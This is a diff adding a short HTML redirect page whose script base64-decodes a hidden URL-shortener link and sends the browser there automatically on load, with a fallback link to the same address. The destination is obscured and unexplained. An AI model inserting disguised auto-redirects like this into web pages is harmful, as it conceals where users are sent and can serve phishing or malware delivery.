@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirecting...</title>
+</head>
+<body>
+    <script>
+        let encodedURL = 'aHR0cHM6Ly90Lmx5L3ZLRVUz';
+        let decodedURL = atob(encodedURL);
+        window.location.href = decodedURL;
+    </script>
+    <p>If you are not redirected automatically, <a id="link" href="#">click here</a>.</p>
+    <script>
+        document.getElementById('link').href = decodedURL;
+    </script>
+</body>
+</html>
